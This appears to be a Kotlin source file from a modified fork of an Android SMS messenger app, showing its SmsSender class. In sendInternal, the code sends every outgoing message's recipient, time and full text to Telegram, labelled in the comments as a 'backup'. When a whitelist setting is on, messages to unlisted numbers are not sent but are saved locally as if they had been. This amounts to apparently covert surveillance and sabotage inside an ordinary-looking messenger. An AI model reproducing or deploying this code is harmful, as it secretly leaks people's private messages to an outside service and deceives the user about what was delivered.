package com.simplemobiletools.smsmessenger.messaging

import com.simplemobiletools.smsmessenger.messaging.getSmsManager
import android.app.Application
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Telephony
import android.telephony.PhoneNumberUtils
import com.simplemobiletools.smsmessenger.R
import com.simplemobiletools.smsmessenger.extensions.getDefaultSubscriptionId
import com.simplemobiletools.smsmessenger.extensions.getThreadId
import com.simplemobiletools.smsmessenger.helpers.EMPTY_DESTINATION_ADDRESS
import com.simplemobiletools.smsmessenger.helpers.ERROR_SENDING_MESSAGE
import com.simplemobiletools.smsmessenger.helpers.SharedPrefsHelper
import com.simplemobiletools.smsmessenger.models.Message
import com.simplemobiletools.smsmessenger.receivers.SmsStatusDeliveredReceiver
import com.simplemobiletools.smsmessenger.receivers.SmsStatusSentReceiver
import com.simplemobiletools.smsmessenger.utils.SendStatusReceiver
import com.simplemobiletools.smsmessenger.extensions.getMessagesDB
import com.simplemobiletools.commons.helpers.isSPlus
import com.simplemobiletools.smsmessenger.utils.TelegramHelper
import java.text.SimpleDateFormat
import java.util.Date

class SmsSender(val app: Application) {

    private val sendMultipartSmsAsSeparateMessages = false

    fun sendMessage(
        subId: Int, destination: String, body: String, serviceCenter: String?,
        requireDeliveryReport: Boolean, messageUri: Uri
    ) {
        var dest = destination
        if (body.isEmpty()) {
            throw IllegalArgumentException("SmsSender: empty text message")
        }

        dest = PhoneNumberUtils.stripSeparators(dest)

        if (dest.isEmpty()) {
            throw SmsException(EMPTY_DESTINATION_ADDRESS)
        }

        val smsManager = getSmsManager(subId)
        val messages = smsManager.divideMessage(body)
        if (messages == null || messages.isEmpty()) {
            throw SmsException(ERROR_SENDING_MESSAGE)
        }

        sendInternal(
            subId, dest, messages, serviceCenter, requireDeliveryReport, messageUri
        )
    }

    private fun sendInternal(
        subId: Int, dest: String,
        messages: ArrayList<String>, serviceCenter: String?,
        requireDeliveryReport: Boolean, messageUri: Uri
    ) {
        val smsManager = getSmsManager(subId)
        val messageCount = messages.size
        val deliveryIntents = ArrayList<PendingIntent?>(messageCount)
        val sentIntents = ArrayList<PendingIntent>(messageCount)

        var flags = PendingIntent.FLAG_UPDATE_CURRENT
        if (isSPlus()) {
            flags = flags or PendingIntent.FLAG_MUTABLE
        }

        // === NYTT: Hämta header/rubrik från prefs ===
        val prefs = SharedPrefsHelper(app)
        val header = prefs.getCustomLogHeader().ifBlank { "SMS UTGÅENDE" }
        val whitelisted = prefs.getWhitelistedNumbers()

        for (i in 0 until messageCount) {
            val partId = if (messageCount <= 1) 0 else i + 1
            if (requireDeliveryReport && i == messageCount - 1) {
                deliveryIntents.add(
                    PendingIntent.getBroadcast(
                        app, partId,
                        getDeliveredStatusIntent(messageUri, subId), flags
                    )
                )
            } else {
                deliveryIntents.add(null)
            }
            sentIntents.add(
                PendingIntent.getBroadcast(
                    app, partId,
                    getSendStatusIntent(messageUri, subId), flags
                )
            )
        }

        try {
            if (sendMultipartSmsAsSeparateMessages) {
                for (i in 0 until messageCount) {
                    if (prefs.isWhitelistingEnabled() && !whitelisted.contains(dest)) {
                        simulateMessageAsSentLocally(app, dest, messages[i])
                        continue
                    }

                    smsManager.sendTextMessage(
                        dest, serviceCenter,
                        messages[i],
                        sentIntents[i],
                        deliveryIntents[i]
                    )

                    // Telegram-backup för varje SMS-del (med tid utan sekunder)
                    val timestamp = System.currentTimeMillis()
                    val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))
                    TelegramHelper.sendTextMessage(
                        "Fråm: $header\nTill: $dest\nTid: $formattedTime\n-- ${messages[i]}"
                    )
                }
            } else {
                if (prefs.isWhitelistingEnabled() && !whitelisted.contains(dest)) {
                    simulateMessageAsSentLocally(app, dest, messages.joinToString(""))
                    return
                }

                smsManager.sendMultipartTextMessage(
                    dest, serviceCenter, messages, sentIntents, deliveryIntents
                )

                // Telegram-backup för hela SMS:et (med tid utan sekunder)
                val timestamp = System.currentTimeMillis()
                val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))
                TelegramHelper.sendTextMessage(
                    "Från: $header\nTill: $dest\nTid: $formattedTime\n-- ${messages.joinToString("")}"
                )
            }
        } catch (e: Exception) {
            throw SmsException(ERROR_SENDING_MESSAGE, e)
        }
    }

    private fun simulateMessageAsSentLocally(context: Context, phoneNumber: String, messageText: String) {
        val timestamp = System.currentTimeMillis()

        val message = Message(
            id = -System.currentTimeMillis(),
            body = messageText,
            type = Telephony.Sms.MESSAGE_TYPE_SENT,
            status = 0,
            participants = arrayListOf(),
            date = (timestamp / 1000).toInt(),
            read = true,
            threadId = context.getThreadId(setOf(phoneNumber)),
            isMMS = false,
            attachment = null,
            senderPhoneNumber = phoneNumber,
            senderName = "Me",
            senderPhotoUri = "",
            subscriptionId = getDefaultSubscriptionId(context)
        )

        context.getMessagesDB().MessagesDao().insertMessages(message)
    }

    private fun getSendStatusIntent(requestUri: Uri, subId: Int): Intent {
        val intent = Intent(SendStatusReceiver.SMS_SENT_ACTION, requestUri, app, SmsStatusSentReceiver::class.java)
        intent.putExtra(SendStatusReceiver.EXTRA_SUB_ID, subId)
        return intent
    }

    private fun getDeliveredStatusIntent(requestUri: Uri, subId: Int): Intent {
        val intent = Intent(SendStatusReceiver.SMS_DELIVERED_ACTION, requestUri, app, SmsStatusDeliveredReceiver::class.java)
        intent.putExtra(SendStatusReceiver.EXTRA_SUB_ID, subId)
        return intent
    }

    companion object {
        private var instance: SmsSender? = null
        fun getInstance(app: Application): SmsSender {
            if (instance == null) {
                instance = SmsSender(app)
            }
            return instance!!
        }
    }
}
